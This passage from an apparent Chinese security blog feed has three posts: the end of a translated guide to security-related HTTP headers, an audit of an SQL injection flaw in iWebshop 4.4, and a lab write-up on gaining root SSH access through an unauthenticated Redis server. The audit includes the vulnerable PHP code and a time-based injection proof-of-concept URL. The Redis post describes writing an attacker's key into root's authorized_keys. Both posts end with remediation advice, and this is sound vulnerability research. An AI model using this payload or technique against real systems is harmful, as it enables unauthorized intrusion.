</code></pre><h2 id="Server-X-Powered-By"><a href="#Server-X-Powered-By" class="headerlink" title="Server / X-Powered-By"></a>Server / X-Powered-By</h2><p>这两个头部会显示在用的服务器软件和它的版本号，这些头部可能在调试的适合很有用，但是对用户体验没有任何用处，应该要么被去掉或者减少到不泄露任何版本信息。</p>
<h2 id="Caching-directives"><a href="#Caching-directives" class="headerlink" title="Caching directives"></a>Caching directives</h2><p>另一个经常被忽视的问题是浏览器缓存的敏感信息，浏览器经常存储网站元素到本地高速缓存以加速浏览体验。对一些不敏感的站点和元素比如图片或样式信息来说，这样是可以的，但是对于敏感信息（比如来自<code>web</code>应用认证区域的页面）要避免这样做。这个问题在共享计算机环境（比如说办公室，学校，网咖）下变得更糟糕，其他用户可以很容易的接触到你的浏览器缓存。要告诉浏览器（可能是中间缓存，如代理）不存储任何东西在它的缓存里面需要使用如下命令：</p>
<pre><code>Cache-Control: no-cache, no-store
Expires: 0
Pragma: no-cache
</code></pre><p>要注意的是经常遇到的命令<code>Cache-Control: private</code>在共享计算机的环境中不能被认为是安全的，因为它允许浏览器去存储这些元素到他的缓存里面。</p>
<h3 id="ETag"><a href="#ETag" class="headerlink" title="ETag"></a>ETag</h3><p><code>Entity Tag</code>（缩写<code>ETag</code>）头部是作缓存用途的，服务器使用特殊的算法为它提供的每个文件版本计算一个单独的<code>ETag</code>，浏览器然后能够请求服务器查看是否该<code>ETag</code>文件仍然可用，如果可用，服务器返回一个<code>304</code>状态码给浏览器，让它使用本地缓存的版本，否则服务器发送完整的资源和<code>200</code>状态码。</p>
<p>虽然这是一个有用的头部，你会发现有时会在漏洞相关的文章或报告对它的引用。问题是<code>Apache</code>的某些版本（2.3.14之前的版本中）用于披露对于在其默认的配置提供服务的文件索引节点。索引节点可用于进一步的攻击，例如通过网络文件系统（<code>NFS</code>），使用这些<code>INode</code>节点来创建文件句柄。有问题的默认配置已经在最近版本的<code>Apache</code>得到了纠正，但是你扔应该确保在<code>httpd.conf</code>里你相应的<code>FileETag</code>设置不包含<code>INode</code>属性。下面这行是好的设置：</p>
<pre><code>FileETag MTime Size
</code></pre><p>下面这行不是：</p>
<pre><code>FileETag INode MTime Size
</code></pre><h2 id="X-Robots-Tag-和-Robots-txt"><a href="#X-Robots-Tag-和-Robots-txt" class="headerlink" title="X-Robots-Tag 和 Robots.txt"></a>X-Robots-Tag 和 Robots.txt</h2><p><code>X-Robots-Tag</code>头部能被用告诉搜索引擎（支持该头部）页面或文件如何被索引。和<code>robots.txt</code>或者<code>robots</code>的<code>meta</code>标签比起来，<code>X-Robots-Tag</code>的优点是它的头部能被全局配置，还可以调整到一个非常精细的和灵活的水平（比如正则表达式匹配特定的<code>URL</code>）。发送一个<code>meta</code>标签和媒体文件是不可能的，发送<code>HTTP</code>头部和媒体文件是没问题的。它还有优点就是在每个请求的基础上公开信息而不是在单一的文件上。试想一下，你不想让任何人知道的秘密目录，把它们列成一个清单在<code>robots.txt</code>文件上？也许因为一个不好的想法就会让所有人马上知道你想隐藏什么–你可能只是发了一个连接在你的网站上。</p>
<p>所以你应该干脆抛弃<code>robots.txt</code>而完全依赖<code>X-Robots-Tag</code>呢？或许不会，应该在最大兼容性下将他们组合使用。然而要记住，<code>robots.txt</code>应该仅仅包含你需要索引的文件和目录。你不应该列出哪些你想要隐藏的文件，相反的，可以放置一个不允许条目在<code>robots.txt</code>文件里。</p>
<p>阻止一切的例子：</p>
<pre><code>User-Agent: *
Disallow: /
</code></pre><p>告诉爬虫索引<code>/Public/</code>目录下的所有文件，剩下的不让索引：</p>
<pre><code>User-Agent: *
Allow: /Public/
Disallow: /
</code></pre><h2 id="给不同的HTTP服务器添加自定义的头部"><a href="#给不同的HTTP服务器添加自定义的头部" class="headerlink" title="给不同的HTTP服务器添加自定义的头部"></a>给不同的HTTP服务器添加自定义的头部</h2><p>下面你能找到关于如何在不同的<code>HTTP</code>服务器软件里设置静态自定义的<code>HTTP</code>头部的例子。</p>
<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p>对于<code>Apache</code>，推荐使用模块<code>mod_headers</code>去控制<code>http</code>头。命令<code>Header</code>能够被置于配置文件的任何地方，比如：</p>
<pre><code>&lt;Directory &quot;/var/www/dir1&quot;&gt;
    Options +Indexes
    Header set X-XSS-Protection “1; mode=block”
&lt;/Directory&gt;
</code></pre><p>要更详细的了解关于如何使用<code>mod_headers</code>设置<code>HTTP</code>头的指导请参考这个<a href="http://httpd.apache.org/docs/current/mod/mod_headers.html" target="_blank" rel="external">页面</a></p>
<h3 id="Internet-Information-Services-IIS"><a href="#Internet-Information-Services-IIS" class="headerlink" title="Internet Information Services (IIS)"></a>Internet Information Services (IIS)</h3><p>对于<code>IIS 6.0-10.0</code>，这里有两个方式设置自定义头部：</p>
<ul>
<li><p>通过命令行</p>
<pre><code>appcmd set config /section:httpProtocol /+customHeaders.[name=&apos;X-XSS-Protection&apos;,value=&apos;1; mode=block&apos;]
</code></pre></li>
<li><p>通过图形界面</p>
<p>  打开<code>IIS Manager</code>，使用<strong>Conections</strong>面板找到你想要开启的头部合适的级别，双击<strong>HTTP Response Headers</strong>。现在单击<strong>Add…</strong>然后为这个头部设置你想要设置的名称和值。例子中名称将会是<code>X-XSS-Protection</code>，值将会是<code>1; mode=block</code>。</p>
</li>
</ul>
<p>要更详细的了解关于如何使用<code>IIS</code>设置<code>HTTP</code>头的指导请参考这个<a href="https://www.iis.net/configreference/system.webserver/httpprotocol/customheaders" target="_blank" rel="external">页面</a></p>
<h3 id="Lighttpd"><a href="#Lighttpd" class="headerlink" title="Lighttpd"></a>Lighttpd</h3><p>对于<code>Lighttpd</code>推荐使用模块<code>mod_setenvs</code>去控制<code>apache</code>头部，命令<code>setenv.add-response-header</code>能够被置于配置文件的任何地方，比如：</p>
<pre><code>setenv.add-response-header = (
  &quot;X-XSS-Protection&quot; =&gt; &quot;1; mode=Block&quot;
)
</code></pre><p>要更详细的了解关于如何使用<code>Lighttpd</code>设置<code>HTTP</code>头的指导请参考这个<a href="https://redmine.lighttpd.net/projects/1/wiki/Docs_ModSetEnv" target="_blank" rel="external">页面</a></p>
<h3 id="NGINX"><a href="#NGINX" class="headerlink" title="NGINX"></a>NGINX</h3><p>对于<code>NGINX</code>推荐使用模块<code>ngx_http_headers_module</code>去控制<code>HTTP</code>头，命令<code>add_header</code>能够被置于配置文件中合适的位置，比如：</p>
<pre><code>server {
    listen       80;
    server_name  domain1.com www.domain1.com;
    root         html;

    location / {
      add_header X-XSS-Protection “1; mode=Block” always
    }
}
</code></pre><p>要更详细的了解关于使用<code>NGINX</code>设置<code>HTTP</code>头的指导请参考这个<a href="http://nginx.org/en/docs/http/ngx_http_headers_module.html" target="_blank" rel="external">页面</a></p>
<h1 id="总结和结论"><a href="#总结和结论" class="headerlink" title="总结和结论"></a>总结和结论</h1><p>已经看到有或多或少的新的<code>HTTP</code>头能够主动的促进站点安全。我们还能看到有几个公认的头部可能值得重新审视，以减少被泄露的信息量。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://www.chromium.org/hsts" target="_blank" rel="external">HTTP Strict Transport Security Pre-Load.</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers" target="_blank" rel="external">Mozilla Developer Network – HTTP Headers.</a></li>
<li><a href="https://tools.ietf.org/html/rfc6797" target="_blank" rel="external">RFC6797: HTTP Strict Transport Security (HSTS).</a></li>
<li><a href="https://tools.ietf.org/html/rfc7034" target="_blank" rel="external">RFC7034: HTTP Header Field X-Frame-Options.</a></li>
<li><a href="https://tools.ietf.org/html/rfc7469" target="_blank" rel="external">RFC7469: Public Key Pinning Extension for HTTP.</a></li>
</ul>
<hr>
<p>PS：没有完全一字一句的翻译，有些内容翻译不出那种味道，部分内容按照自己的理解整理的。</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;来源：&lt;a href=&quot;http://www.contextis.com/resources/blog/security-http-headers&quot;&gt;http://www.contextis.com/resources/blog/security-http-headers&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;当谈论到web应用安全，我们经常考虑到的是：过滤用户的输入、加密渠道传递数据和使用安全的函数这些明显的点，而忽略在web安全上HTTP返回头部和现代web浏览器相结合产生的正面影响，这篇文章试图阐明&lt;code&gt;HTTP Headers&lt;/code&gt;对web安全的主动和被动影响。&lt;/p&gt;
&lt;h1 id=&quot;主动安全&quot;&gt;&lt;a href=&quot;#主动安全&quot; class=&quot;headerlink&quot; title=&quot;主动安全&quot;&gt;&lt;/a&gt;主动安全&lt;/h1&gt;&lt;p&gt;我们查阅&lt;a href=&quot;https://www.owasp.org/index.php/Main_Page&quot;&gt;OWASP&lt;/a&gt;推荐的&lt;code&gt;HTTP Headers&lt;/code&gt;，下面这些&lt;code&gt;headers&lt;/code&gt;能够被利用起来主动地增加web应用的安全性。&lt;/p&gt;
&lt;h2 id=&quot;X-Frame-Options&quot;&gt;&lt;a href=&quot;#X-Frame-Options&quot; class=&quot;headerlink&quot; title=&quot;X-Frame-Options&quot;&gt;&lt;/a&gt;X-Frame-Options&lt;/h2&gt;
    
    </summary>
    
    
      <category term="安全" scheme="http://wismartzy.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="翻译" scheme="http://wismartzy.github.io/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>iWebshop 4.4 SQL 注入漏洞</title>
    <link href="http://wismartzy.github.io/2016/05/20/iWebshop-4-4-SQL-Injection/"/>
    <id>http://wismartzy.github.io/2016/05/20/iWebshop-4-4-SQL-Injection/</id>
    <published>2016-05-20T14:21:09.000Z</published>
    <updated>2017-03-19T06:30:43.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h1><p>iWebShop是一款基于PHP语言开发b2b2c开源多用户商城系统，支持平台自营和多商家入驻、微信商城系统、手机商城系统、移动端商城系统、APP商城系统等多功能性的购物平台系统。</p>
<h1 id="0x02-审计"><a href="#0x02-审计" class="headerlink" title="0x02 审计"></a>0x02 审计</h1><h2 id="框架简介"><a href="#框架简介" class="headerlink" title="框架简介"></a>框架简介</h2><blockquote>
<p>iWebshop是单一入口系统，所有的处理都要通过入口文件<code>index.php</code>来运行。<br>系统框架对当前<code>URL</code>路径进行分析，找到<code>controller(控制器)</code>和<code>action(动作)</code>，去调用控制器文件里面的动作方法。<br>在<code>action</code>动作中可以读取数据，处理业务逻辑，然后把完成的数据渲染到视图，给终端客户呈现出来。</p>
</blockquote>
<h2 id="漏洞概况"><a href="#漏洞概况" class="headerlink" title="漏洞概况"></a>漏洞概况</h2><a id="more"></a>
<blockquote>
<p>漏洞功能：后台-&gt;系统-&gt;配送方式-&gt;删除</p>
<p>漏洞文件：/controllers/system.php</p>
</blockquote>
<h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><blockquote>
<p>/controllers/system.php</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * <span class="doctag">@brief</span> 配送方式删除和还原</div><div class="line"> */</div><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delivery_operate</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	$id = IReq::get(<span class="string">'id'</span>);</div><div class="line">	$op = IReq::get(<span class="string">'op'</span>);</div><div class="line">       <span class="keyword">if</span>(is_array($id)) $id = implode(<span class="string">','</span>,$id);</div><div class="line"></div><div class="line">       <span class="keyword">if</span>(<span class="keyword">empty</span>($id))</div><div class="line">       &#123;</div><div class="line">       	<span class="keyword">if</span>($op == <span class="string">'del'</span> || $op == <span class="string">'recover'</span>)</div><div class="line">       	&#123;</div><div class="line">       		<span class="keyword">$this</span>-&gt;redirect(<span class="string">'delivery_recycle'</span>,<span class="keyword">false</span>);</div><div class="line">       	&#125;</div><div class="line">       	<span class="keyword">else</span></div><div class="line">       	&#123;</div><div class="line">       		<span class="keyword">$this</span>-&gt;redirect(<span class="string">'delivery'</span>,<span class="keyword">false</span>);</div><div class="line">       	&#125;</div><div class="line">       	Util::showMessage(<span class="string">'请选择要操作的选项'</span>);</div><div class="line">       	<span class="keyword">exit</span>;</div><div class="line">       &#125;</div><div class="line"></div><div class="line">	$delivery     =  <span class="keyword">new</span> IModel(<span class="string">'delivery'</span>);</div><div class="line">	$deliveryData = $delivery-&gt;query(<span class="string">'id in ('</span>.$id.<span class="string">')'</span>,<span class="string">'name'</span>);</div><div class="line">	$deliveryName = <span class="keyword">array</span>();</div><div class="line">	<span class="keyword">foreach</span>($deliveryData <span class="keyword">as</span> $val)</div><div class="line">	&#123;</div><div class="line">		$deliveryName[] = $val[<span class="string">'name'</span>];</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$logObj = <span class="keyword">new</span> log(<span class="string">'db'</span>);</div><div class="line"></div><div class="line">	<span class="comment">//物理删除</span></div><div class="line">	<span class="keyword">if</span>($op==<span class="string">'del'</span>)</div><div class="line">	&#123;</div><div class="line">		$delivery-&gt;del(<span class="string">'id in('</span>.$id.<span class="string">')'</span>);</div><div class="line"></div><div class="line">		$logObj-&gt;write(<span class="string">'operation'</span>,<span class="keyword">array</span>(<span class="string">"管理员:"</span>.<span class="keyword">$this</span>-&gt;admin[<span class="string">'admin_name'</span>],<span class="string">"删除了回收站中的配送方式"</span>,<span class="string">"被删除的配送方式为："</span>.join(<span class="string">','</span>,$deliveryName)));</div><div class="line"></div><div class="line">		<span class="keyword">$this</span>-&gt;redirect(<span class="string">'delivery_recycle'</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span> <span class="keyword">if</span>($op ==<span class="string">'recover'</span>)<span class="comment">//还原</span></div><div class="line">	&#123;</div><div class="line">		$delivery-&gt;setData(<span class="keyword">array</span>(<span class="string">'is_delete'</span>=&gt;<span class="number">0</span>));</div><div class="line">		<span class="keyword">if</span>($delivery-&gt;update(<span class="string">'id in('</span>.$id.<span class="string">')'</span>))</div><div class="line">		&#123;</div><div class="line">			$logObj-&gt;write(<span class="string">'operation'</span>,<span class="keyword">array</span>(<span class="string">'管理员:'</span>.<span class="keyword">$this</span>-&gt;admin[<span class="string">'admin_name'</span>],<span class="string">'恢复了回收站中的配送方式'</span>,<span class="string">'被恢复的配送方式为：'</span>.join(<span class="string">','</span>,$deliveryName)));</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">$this</span>-&gt;redirect(<span class="string">'delivery_recycle'</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span><span class="comment">//逻辑删除</span></div><div class="line">	&#123;</div><div class="line">		$delivery-&gt;setData(<span class="keyword">array</span>(<span class="string">'is_delete'</span>=&gt;<span class="number">1</span>));</div><div class="line">		<span class="keyword">if</span>($delivery-&gt;update(<span class="string">'id in('</span>.$id.<span class="string">')'</span>))</div><div class="line">		&#123;</div><div class="line">			$logObj-&gt;write(<span class="string">'operation'</span>,<span class="keyword">array</span>(<span class="string">"管理员:"</span>.<span class="keyword">$this</span>-&gt;admin[<span class="string">'admin_name'</span>],<span class="string">"把配送方式移除到回收站中"</span>,<span class="string">"被移除到回收站中的配送方式为："</span>.join(<span class="string">','</span>,$deliveryName)));</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">$this</span>-&gt;redirect(<span class="string">'delivery'</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>跟进<code>$id = IReq::get(&#39;id&#39;);</code></p>
<blockquote>
<p>/lib/core/util/req_class.php</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * <span class="doctag">@class</span> IReq</div><div class="line"> * <span class="doctag">@brief</span> 获取$_GET,$_POST的数据</div><div class="line"> */</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">IReq</span></span></div><div class="line">&#123;</div><div class="line">	<span class="comment">/**</span></div><div class="line">	 * <span class="doctag">@brief</span> 获取键为$key的 $_GET 和 $_POST 传送方式的数据</div><div class="line">	 * <span class="doctag">@param</span> string $key $_GET 或 $_POST 的键</div><div class="line">	 * <span class="doctag">@param</span> string $type 传送方式 值: false:默认(先get后post); get:get方式; post:post方式;</div><div class="line">	 * <span class="doctag">@return</span> string $_GET 或者 $_POST 的值</div><div class="line">	 * <span class="doctag">@note</span> 优先获取 $_GET 方式的数据,如果不存在则获取 $_POST 方式的数据</div><div class="line">	 */</div><div class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $type=false)</span></span></div><div class="line">	&#123;</div><div class="line">		<span class="comment">//默认方式</span></div><div class="line">		<span class="keyword">if</span>($type==<span class="keyword">false</span>)</div><div class="line">		&#123;</div><div class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[$key])) <span class="keyword">return</span> $_GET[$key];</div><div class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[$key])) <span class="keyword">return</span> $_POST[$key];</div><div class="line">			<span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">//get方式</span></div><div class="line">		<span class="keyword">else</span> <span class="keyword">if</span>($type==<span class="string">'get'</span> &amp;&amp; <span class="keyword">isset</span>($_GET[$key]))</div><div class="line">			<span class="keyword">return</span> $_GET[$key];</div><div class="line"></div><div class="line">		<span class="comment">//post方式</span></div><div class="line">		<span class="keyword">else</span> <span class="keyword">if</span>($type==<span class="string">'post'</span> &amp;&amp; <span class="keyword">isset</span>($_POST[$key]))</div><div class="line">			<span class="keyword">return</span> $_POST[$key];</div><div class="line"></div><div class="line">		<span class="comment">//无匹配</span></div><div class="line">		<span class="keyword">else</span></div><div class="line">			<span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line"></div><div class="line">	&#125;</div><div class="line">	...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>此处获取<code>$_GET</code>参数后是没有任何过滤直接返回值的。再回到<code>delivery_operate</code>函数，<br><code>$deliveryData = $delivery-&gt;query(&#39;id in (&#39;.$id.&#39;)&#39;,&#39;name&#39;);</code>可以看到<code>$id</code>被直接带入了SQL语句中，造成了SQL注入问题。</p>
<h1 id="0x03-漏洞验证"><a href="#0x03-漏洞验证" class="headerlink" title="0x03 漏洞验证"></a>0x03 漏洞验证</h1><p>由于此处是删除（逻辑删除）操作，没有回显，不过可以构造如下请求验证漏洞</p>
<blockquote>
<p><a href="http://localhost:8888/iwebshop4.4/index.php?controller=system&amp;action=delivery_operate&amp;id=2" target="_blank" rel="external">http://localhost:8888/iwebshop4.4/index.php?controller=system&amp;action=delivery_operate&amp;id=2</a>) and if(1=1, sleep(4), 0)#</p>
</blockquote>
<p>请求效果如下</p>
<p><img src="/images/iwebshop-1.png" alt="iWebshop-01"></p>
<p>poc中只指定<code>sleep 4s</code> 可是这个请求一共消耗了<code>8s</code>，这是由于<code>delivery_operate</code>函数中在<code>query/select</code>后又进行了一次<code>update</code>操作，所以该poc代码执行了两次（共<code>8s</code>），另外也可以通过mysql log也可以反馈<code>8s</code>的由来。</p>
<p><img src="/images/mysql-log.png" alt="iWebshop-02"></p>
<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>该漏洞产生的直接原因是<code>$id</code>变量未经过任何过滤就拼接SQL语句，因此一定要确保所有带入数据库的参数都经过了严格的过滤。当然，如果是PHP应用，推荐采用<code>PDO</code>方式操作数据库，使用参数绑定能有效的防止<code>SQL Injection</code>问题。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-背景&quot;&gt;&lt;a href=&quot;#0x01-背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景&quot;&gt;&lt;/a&gt;0x01 背景&lt;/h1&gt;&lt;p&gt;iWebShop是一款基于PHP语言开发b2b2c开源多用户商城系统，支持平台自营和多商家入驻、微信商城系统、手机商城系统、移动端商城系统、APP商城系统等多功能性的购物平台系统。&lt;/p&gt;
&lt;h1 id=&quot;0x02-审计&quot;&gt;&lt;a href=&quot;#0x02-审计&quot; class=&quot;headerlink&quot; title=&quot;0x02 审计&quot;&gt;&lt;/a&gt;0x02 审计&lt;/h1&gt;&lt;h2 id=&quot;框架简介&quot;&gt;&lt;a href=&quot;#框架简介&quot; class=&quot;headerlink&quot; title=&quot;框架简介&quot;&gt;&lt;/a&gt;框架简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;iWebshop是单一入口系统，所有的处理都要通过入口文件&lt;code&gt;index.php&lt;/code&gt;来运行。&lt;br&gt;系统框架对当前&lt;code&gt;URL&lt;/code&gt;路径进行分析，找到&lt;code&gt;controller(控制器)&lt;/code&gt;和&lt;code&gt;action(动作)&lt;/code&gt;，去调用控制器文件里面的动作方法。&lt;br&gt;在&lt;code&gt;action&lt;/code&gt;动作中可以读取数据，处理业务逻辑，然后把完成的数据渲染到视图，给终端客户呈现出来。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;漏洞概况&quot;&gt;&lt;a href=&quot;#漏洞概况&quot; class=&quot;headerlink&quot; title=&quot;漏洞概况&quot;&gt;&lt;/a&gt;漏洞概况&lt;/h2&gt;
    
    </summary>
    
    
      <category term="安全" scheme="http://wismartzy.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Redis crackIT 漏洞</title>
    <link href="http://wismartzy.github.io/2015/11/11/Redis-crackIT/"/>
    <id>http://wismartzy.github.io/2015/11/11/Redis-crackIT/</id>
    <published>2015-11-11T07:50:05.000Z</published>
    <updated>2017-03-19T06:33:07.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于漏洞"><a href="#关于漏洞" class="headerlink" title="关于漏洞"></a>关于漏洞</h2><p>漏洞发生的前提：</p>
<blockquote>
<p>1、Redis 服务暴露在公网</p>
<p>2、Redis 配置未设置口令或弱口令</p>
<p>3、Redis 配置文件未设置 Bind ip</p>
<p>4、Redis 服务所在机器开启了 SSH 服务，且默认 22 端口对外开放</p>
</blockquote>
<p>说明：第<code>1</code>点中 Redis 服务暴露公网的情况下，若使用的是默认端口 6379，则很容易被黑客全网批量扫描到。</p>
<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>首先在一台虚拟机（<code>inet 10.0.100.210</code>）中安装了 redis，完全采用默认配置（意味着未设置 Bind ip，未设置口令）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[root@localhost redis-3.0.5]<span class="comment"># ps -ef | grep redis</span></div><div class="line">root      4448  3629  0 15:24 pts/2    00:00:00 src/redis-server *:6379</div></pre></td></tr></table></figure>
<p>另外，可以看到 Redis 还是以 root 用户启动运行的。</p>
<a id="more"></a>
<p>现在从另一台机器（<code>inet 10.0.100.164</code>）去攻击此台 Redis 服务器</p>
<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>生成一个新的 SSH Public Key，并保存在文件<code>foo.txt</code>中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(<span class="built_in">echo</span> <span class="_">-e</span> <span class="string">"\n\n"</span>; cat id_rsa.pub; <span class="built_in">echo</span> <span class="_">-e</span> <span class="string">"\n\n"</span>) &gt; foo.txt</div></pre></td></tr></table></figure>
<p><img src="/images/redis-1.png" alt="redis-1"></p>
<p>这里有换行是关键，体现在后面将内存数据导出到<code>authorized_keys</code>文件的时候</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>将<code>foo.txt</code>内容写入 redis 内存，flushall 将清除数据库所有的 key，后面一步是将公钥保存给 crackit</p>
<p><img src="/images/redis-2.png" alt="redis-2"></p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>将内存中得数据导出到<code>authorized_keys</code>文件中</p>
<p><img src="/images/redis-3.1.png" alt="redis-3.1"></p>
<p>再去 Redis 服务所在的机器上去看 root 用户的<code>authorized_keys</code></p>
<p><img src="/images/redis-3.2.png" alt="redis-3.2"></p>
<p>可以看到我的 Public Key 已经写到了这台机器的<code>authorized_key</code>里面了，从这里也可以看出如果当时第一步的时候<code>foo.txt</code>内保存的 Public Key 没有空行，那么得到的就是一串乱码了，尽管其中含有我的 Public Key，仍然不能登录，就像下面这个样子：</p>
<p><img src="/images/redis-3.3.png" alt="redis-3.3"></p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>成功登录</p>
<p><img src="/images/redis-4.png" alt="redis-4"></p>
<h2 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h2><p>可以看到执行的命令都是 Redis 的一些正常功能，漏洞发生的本质还是配置不合理。Redis 的官方文档中明确指定了</p>
<p><img src="/images/redis-5.png" alt="redis-5"></p>
<p>具体如何防御可以根据前面提到的漏洞发生的前提针对性采取如下措施：</p>
<blockquote>
<p>1、Redis 不要开放到公网访问</p>
<p>2、为 Redis 建立单独用户和强密码</p>
<p>3、为 Redis 绑定 ip 地址</p>
<p>4、Redis 所在服务器的 OpenSSH 服务（<code>default port 22</code>）不对外开放</p>
</blockquote>
<p>当然对常见服务（Redis，MySQL，OpenSSH 等）修改其默认端口，在出现 Bug 时候也能阻止一些脚本黑客的针对默认端口的批量扫描攻击。</p>
<h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><p>网上公布了一组调查数据“针对 15 万台对公网开放的 Redis 服务器跟踪分析，发现有 15238 台未进行认证配置，也就是说超过<code>10%</code>的服务器可以直接连接；其中又有 10312 台服务器被入侵，总比例超过<code>67%</code>”。这个是我在 ZoomEye 上搜一下全网开放 6379 端口的主机，可以看到还是有不少的</p>
<p><img src="/images/redis-6.png" alt="redis-6"></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;关于漏洞&quot;&gt;&lt;a href=&quot;#关于漏洞&quot; class=&quot;headerlink&quot; title=&quot;关于漏洞&quot;&gt;&lt;/a&gt;关于漏洞&lt;/h2&gt;&lt;p&gt;漏洞发生的前提：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1、Redis 服务暴露在公网&lt;/p&gt;
&lt;p&gt;2、Redis 配置未设置口令或弱口令&lt;/p&gt;
&lt;p&gt;3、Redis 配置文件未设置 Bind ip&lt;/p&gt;
&lt;p&gt;4、Redis 服务所在机器开启了 SSH 服务，且默认 22 端口对外开放&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;说明：第&lt;code&gt;1&lt;/code&gt;点中 Redis 服务暴露公网的情况下，若使用的是默认端口 6379，则很容易被黑客全网批量扫描到。&lt;/p&gt;
&lt;h2 id=&quot;实验&quot;&gt;&lt;a href=&quot;#实验&quot; class=&quot;headerlink&quot; title=&quot;实验&quot;&gt;&lt;/a&gt;实验&lt;/h2&gt;&lt;p&gt;首先在一台虚拟机（&lt;code&gt;inet 10.0.100.210&lt;/code&gt;）中安装了 redis，完全采用默认配置（意味着未设置 Bind ip，未设置口令）&lt;/p&gt;
